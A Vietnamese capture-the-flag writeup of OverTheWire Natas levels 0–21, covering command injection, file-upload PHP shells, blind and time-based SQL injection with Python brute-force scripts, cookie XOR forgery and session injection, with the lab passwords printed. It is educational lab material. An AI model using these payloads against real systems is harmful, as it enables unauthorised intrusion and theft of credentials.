---
title: "OverTheWire Natas"
description: "OverTheWire Natas"
summary: "OverTheWire Natas writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-04-08
draft: false
cover: ../../post/natas/feature.jpg

authors:
  - winky
---

Natas là chuỗi các challenge theo level về web security của OverTheWire. Sau khi làm xong thì mình thấy có nhiều kiến thức khá hay mà mình cần lưu lại. Sau đây là writeup của các challenge mà mình đã giải được.

## Natas Level 0

![image](https://hackmd.io/_uploads/B1bGhJKhyg.png)

Ở level này mình mở devtool lên thấy có một đoạn html bị comment là password của level tiếp theo

![image](https://hackmd.io/_uploads/rJXO31K2yl.png)

`Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`

## Natas Level 0 → Level 1

Ở level 1 thì password cũng nằm ở devtool nhưng chuột phải bị cấm nên mình sử dụng F12 để bật lên

![image](https://hackmd.io/_uploads/S1ah3yKh1g.png)

`Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`

## Natas Level 1 → Level 2

![image](https://hackmd.io/_uploads/Hk8twMxC1l.png)

Ở đây mình check source thì thấy có folder files chứa một file users.txt

![image](https://hackmd.io/_uploads/S1fG4xY3ye.png)

Bật lên và có luôn password 

![image](https://hackmd.io/_uploads/H1qqXlt2ke.png)

`Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

## Natas Level 2 → Level 3

![image](https://hackmd.io/_uploads/H1NQElYnyl.png)

Ở đây mình check source thì có nói đến một file mà Google sẽ xem và đó là robots.txt

![image](https://hackmd.io/_uploads/ryfNNeKn1x.png)

vào thư mục s3cr3t trên và tiếp tục có users.txt

![image](https://hackmd.io/_uploads/HkgRV4gKnJe.png)


![image](https://hackmd.io/_uploads/ryrBNet2Jl.png)

`Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

## Natas Level 3 → Level 4

![image](https://hackmd.io/_uploads/H159EgY3kg.png)

Ok thì web yêu cầu ta phải đến từ một url natas5 gì đó nên mình sử dụng header Referrer để thông báo trang web nguồn. 

![image](https://hackmd.io/_uploads/rkpxIeF21e.png)

`Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

## Natas Level 4 → Level 5

![image](https://hackmd.io/_uploads/H1Y7IgtnJl.png)

Ở đây web yêu cầu ta đăng nhập. Mở cookie lên và thấy có một cái là loggedin có value là 0

![image](https://hackmd.io/_uploads/ByRr8eK31l.png)

 Chỉnh lại là 1 và mình có mình đã access được 

![image](https://hackmd.io/_uploads/Byn8LxY31e.png)

`Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

## Natas Level 5 → Level 6

![image](https://hackmd.io/_uploads/rJMtIlt3Jl.png)

Ở đây web yêu cầu mình nhập secret gì đó

![image](https://hackmd.io/_uploads/H1TtIeKnkl.png)

Đọc source và thấy web lấy secret từ file includes/secret.inc nên mình vào thử xem luôn 

![image](https://hackmd.io/_uploads/SyC2LgF2Jg.png)


![image](https://hackmd.io/_uploads/HJ31vlY2Jg.png)

`Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

## Natas Level 6 → Level 7

Khi vào web thì mình thấy có param page nhận giá trị là home và about

![image](https://hackmd.io/_uploads/HJz8PlY2ke.png)

mở source lên và thấy file chứa password

![image](https://hackmd.io/_uploads/ryi8vxt3kl.png)

Mình thử path traversal về file đó xem có gì hot 

![image](https://hackmd.io/_uploads/ryLwPlYhJg.png)

`Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

## Natas Level 7 → Level 8

![image](https://hackmd.io/_uploads/SJz9vgt2yg.png)

Level này cũng yêu cầu secret 

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Ok thì yêu cầu là tìm secret sao cho khi cho vào hàm encodeSecret thì thỏa giống $encodedSecret. Đến đây thì mình tạo một script để reverse lại thui.

```python
import base64
s = "3d3d516343746d4d6d6c315669563362"
s = bytes.fromhex(s).decode("utf-8")
s = s[::-1]
s = base64.b64decode(s).decode("utf-8")
print(s)
```

![image](https://hackmd.io/_uploads/ryKCdxKhye.png)

Sau khi chạy thì mình có secret là `oubWYf2kBq`

![image](https://hackmd.io/_uploads/Syj8FgKnkx.png)

`Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

## Natas Level 8 → Level 9

![image](https://hackmd.io/_uploads/HyKYYlKnyx.png)

Ok thì web này dùng để tra từ nhập vào một word và tra trên một file nào đó

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Ở đây mình để ý hàm `passthru("grep -i $key dictionary.txt");` dính lỗi OS command injection. Khi này mình có thể chèn một linux command như sau `;ls;` và nó sẽ trở thành `grep -i ;ls ; dictionary.txt`

và bumphhhhh

![image](https://hackmd.io/_uploads/rkKxqet3ke.png)

Ok ngon. Đến đây thì gọi lệnh để đọc file password thui `; cat ../../../../etc/natas_webpass/natas10;`

![image](https://hackmd.io/_uploads/ByLtigKh1g.png)

`Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

## Natas Level 9 → Level 10

![image](https://hackmd.io/_uploads/HJbnjetnke.png)

Lại là một bài tra từ điển và ở đây web cấm các ký tự sau `[, ;, |, &, ]` 

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Có thể là web cấm ta chèn thêm lệnh vào. Nhưng ta có thể tận dụng lệnh grep để đọc file password như sau `a /etc/natas_webpass/natas11`

Khi đó lệnh trở thành `grep -i a /etc/natas_webpass/natas11 dictionary.txt` và lệnh grep sẽ tìm trong cả 2 file

![image](https://hackmd.io/_uploads/rJrEnethJg.png)

`Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

## Natas Level 10 → Level 11

![image](https://hackmd.io/_uploads/rkBP3gthyg.png)

Web cho ta một trang web đổi màu không có gì đặc biệt nên mình xem source 

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Ok thì tóm tắt là data sẽ có 2 phần từ là showpassword và bgcolor và được lưu ở cookie sau khi encode.

![image](https://hackmd.io/_uploads/BylWTgFnke.png)

Ở đây để encode thì web có sử dụng một key dùng để xor nên mình tiến hành xor lại cái token trong cookie để tìm ra được key 

```php
<?php

function xor_encrypt($in) {
    $key = '{"showpassword":"yes","bgcolor":"#ffffff"}';
    $text = $in;
    $outText = '';
    
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$a = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D";

echo xor_encrypt(base64_decode($a))

?>
```

Ok và key là cái này đây

![image](https://hackmd.io/_uploads/Bkgo6xY2Je.png)

-> key = eDWo

Từ đây mình xây dụng hàm để encode có chứa phần tử showpassword = yes : 

```php
<?php

function xor_encrypt($in) {
    $key = 'eDWo';
    $text = $in;
    $outText = '';
    
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
echo base64_encode(xor_encrypt(json_encode($defaultdata)));

?>
```

![image](https://hackmd.io/_uploads/Hk10alKh1x.png)

Thay vào và có password 

![image](https://hackmd.io/_uploads/B14ZRxt21e.png)

`Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

## Natas Level 11 → Level 12

![image](https://hackmd.io/_uploads/rJezVAxF2kl.png)

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

Ok thì web này cho ta up một file và giới hạn 1KB. Mở source và thấy có một input bị giấu và chứa filename để gửi lên server.

![image](https://hackmd.io/_uploads/BJsxgZKh1g.png)

Ở đây mình up thẳng một file php như sau 

```php
<?php echo file_get_contents("/etc/natas_webpass/natas13");?>
```

![image](https://hackmd.io/_uploads/r1Q7lWK3Je.png)


![image](https://hackmd.io/_uploads/SJLE--Y3kx.png)


Khi vào file php ta vừa up thì php sẽ thực hiện đoạn code và lấy content của file password 

![image](https://hackmd.io/_uploads/Skb9WWYn1e.png)

`Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

## Natas Level 12 → Level 13

![image](https://hackmd.io/_uploads/r1NFCsqhyl.png)

Ok thì level này cũng yêu cầu ta upload một file và phải bắt buộc là file ảnh được check bằng hàm sau `exif_imagetype($_FILES['uploadedfile']['tmp_name'])`

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

Ở đây mình có sẵn một file ảnh cũng chưa tới 1kb nên có thể upload lên dễ dàng (lúc đầu mình chỉ up lên magic bytes nhưng mà không nhận ¯\\_(ツ)_/¯ )

![image](https://hackmd.io/_uploads/HyIFk39nkx.png)

Ok thì sau đó mình có thể thêm một đoạn php để đọc password và đổi tên file lại thành a.php vì web sẽ không check tên file 

![image](https://hackmd.io/_uploads/S1lOXx2q31x.png)

vào file đó và ta có password 

![image](https://hackmd.io/_uploads/HJpVe35hJl.png)

`Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

## Natas Level 13 → Level 14

![image](https://hackmd.io/_uploads/rkPIen521e.png)

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

Bài này là một bài sql injection cơ bản nên mình có thể cắm payload sau

![image](https://hackmd.io/_uploads/rJN5nbk6ye.png)

Và đăng nhập được

![image](https://hackmd.io/_uploads/rkhwsbka1l.png)

`Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

## Natas Level 14 → Level 15

![image](https://hackmd.io/_uploads/Hybsi-ypkx.png)

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

Ok bài này là một dạng blind sql injection cơ bản ta có thể sử dụng payload sau `" OR 1=1 and substr(username,1,1)="a` để tìm ra các username và mình nhận được các username sau 

* alice
* bob
* charlie
* natas16

Ok từ đây mình sử dụng payload `username=natas16 and substring(password,1,1) like binary "a` để tìm password (sở dĩ sử dụng like binary vì trong SQL dấu = sẽ không phân biệt hoa thường). Và mình có script sau để brute force 

```python
import requests
import string
headers = {
    'Host': 'natas15.natas.labs.overthewire.org',
    # 'Content-Length': '49',
    'Cache-Control': 'max-age=0',
    'Authorization': 'Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==',
    'Accept-Language': 'en-US,en;q=0.9',
    'Origin': 'http://natas15.natas.labs.overthewire.org',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://natas15.natas.labs.overthewire.org/',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
}

params = {
    'debug': '1',
}

ch = string.printable
s = ""
for j in range(50):

    for i in ch:

        data = f'username=natas16"+and+substring(password,1,{j+1})+like+binary+"{s+i}'

        res = requests.post(
            'http://natas15.natas.labs.overthewire.org/index.php',
            params=params,
            headers=headers,
            data=data,
            verify=False,
        )
        print(i, s)
        if ('This user exists' in res.text):
            print('Found:', i)
            s += i
            break
```

sau khi chạy thì ta có password

![image](https://hackmd.io/_uploads/SJxcnMy6Jx.png)

`Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

## Natas Level 15 → Level 16

![image](https://hackmd.io/_uploads/BJVhhf16kl.png)

Bài này thì cũng giống bài tra từ điển trước nhưng có thay đổi là input sẽ bỏ trong "" trong lệnh `passthru("grep -i \"$key\" dictionary.txt");`

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Uhm đến đây thì mình dùng một cái gọi là Command substitution

https://unix.stackexchange.com/questions/440088/what-is-command-substitution-in-a-shell#:~:text=32,of%20the%20command.

thì trong ngoặc kép mình có thể chèn một lệnh linux vào và sử dụng output đó để tìm kiếm 

![image](https://hackmd.io/_uploads/rkF-_5F6Jl.png)

Từ đó mình có payload như sau `Africans$(grep -E ^a.* /etc/natas_webpass/natas17)`, mình sẽ sử dụng regex để tìm kiếm và nếu chữ cái đầu của password là a thì sẽ không tìm thấy chữ Africans 

![image](https://hackmd.io/_uploads/H1UN_h96yl.png)

Từ đó mình có thể blind command injection như sau, mình sẽ brute từng char và khi response trả về thì response có ít char nhất thì password chứa chữ đó.

![image](https://hackmd.io/_uploads/HkTPuhca1l.png)

Ok và ta xây dựng script sau 

```python
import requests
import string
headers = {
    'Host': 'natas16.natas.labs.overthewire.org',
    'Authorization': 'Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://natas16.natas.labs.overthewire.org/?needle=Africans%24%28grep+-E+%5Ea.*+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
}

ch = string.ascii_lowercase + string.ascii_uppercase + string.digits
s = ""
for i in range(0, 50):
    for j in ch:

        x = requests.get(
            f'http://natas16.natas.labs.overthewire.org/?needle=Africans%24%28grep+-E+%5E{s}{j}.*+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search',
            headers=headers,
            verify=False,
        )
        print(j, s)
        if "Africans" not in x.text:
            s += j
            print(s)
            break

```

Khi chạy thì ta có password

![image](https://hackmd.io/_uploads/HkX_2h9TJx.png)

`Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

## Natas Level 16 → Level 17

![image](https://hackmd.io/_uploads/H1Wcnh5pJg.png)

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

Ok thì bài này là một bài sql injection nhưng mà không có output nào trả ra cả nên mình nghĩ đến time delays hoặc out-of-band technique. Ok thì mình cắm luôn payload `natas18" AND IF(1=1,SLEEP(5),"a")="a` và có kết quả

![image](https://hackmd.io/_uploads/SJRuf6cT1g.png)

Ok ngon bây giờ thì chỉ cần đổi payload để brute force `natas18" AND IF(substring(password,1,1) LIKE BINARY "n",SLEEP(10),"a")="a` khi chạy thì ta biết được response nào trả về trễ hơn những cái còn lại. 

![image](https://hackmd.io/_uploads/B1MpVacayg.png)

Sau khi brute hết thì ta có password

`Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

## Natas Level 17 → Level 18

![image](https://hackmd.io/_uploads/HyhBvpc61g.png)

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```



Bài này tuy source khá dài nhưng ý chính là tìm session là của admin. Ở đây session là một con số random trong khoảng 640 nên mình sử dụng burpsuite để bruteforce và có session 119 có length khác. 

![image](https://hackmd.io/_uploads/HkxiqaqTyl.png)

`Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

## Natas Level 18 → Level 19

![image](https://hackmd.io/_uploads/rktGjacTkx.png)

Ok thì vẫn là tìm session thui nhưng mà ở đây không còn là số random mà là một chuỗi khá ảo

![image](https://hackmd.io/_uploads/rJqZU0cpJx.png)

Mình thử tạo nhiều session và thấy rằng có phần giống nhau 

![image](https://hackmd.io/_uploads/H1AEI0c61g.png)

Mình thử paste vô kt.gy luôn và nhận ra đó là chuỗi hex và khi decode thì nó có dạng hex({random}-admin)

![image](https://hackmd.io/_uploads/BJe8U05pyx.png)

Ok tiếp tục bruteforce và có được password

![image](https://hackmd.io/_uploads/B1w18R5Tyl.png)

`Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

## Natas Level 19 → Level 20

![image](https://hackmd.io/_uploads/BJU2c0qpkl.png)

```php
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```

Mình thử đăng nhập và bật debug và phát hiện nó sẽ serialize thành `name|s:5:"winky"`

![image](https://hackmd.io/_uploads/HyMTOJi6ke.png)

Ở đây khi mình đọc source của 2 hàm thì nhận ra là các attribute sẽ được ngăn cách bằng dấu \n là dấu xuống dòng. 

```php

// myread

$data = file_get_contents($filename);
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
$parts = explode(" ", $line, 2);
if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
// mywrite

foreach($_SESSION as $key => $value) {
    debug("$key => $value");
    $data .= "$key $value\n";
}

```

Từ đó mình có thể truyền vào một cái crlf như sau để có quyền admin

name winky
admin 1

Sử dụng url encode để có một payload dạng string  `name=winky%0aadmin%201`

![image](https://hackmd.io/_uploads/HyZr9kopkx.png)

`Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`

## Natas Level 20 → Level 21

![image](https://hackmd.io/_uploads/Sk1Vu8oTkg.png)

```php
<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

Ở đây web yêu cầu có quyền admin trong session. Mình thử vào trang web 2 xem có gì hot. 

![image](https://hackmd.io/_uploads/SyFO28o6kl.png)

```php
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

Ok thì web sẽ lấy các param và add vào session nên mình thử cho một cái param admin xem 

![image](https://hackmd.io/_uploads/ry49hLi6Je.png)

web trả về 200 và mình có thể sử dụng session này để log in lại 

![image](https://hackmd.io/_uploads/Syfw2Isakx.png)

`Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`

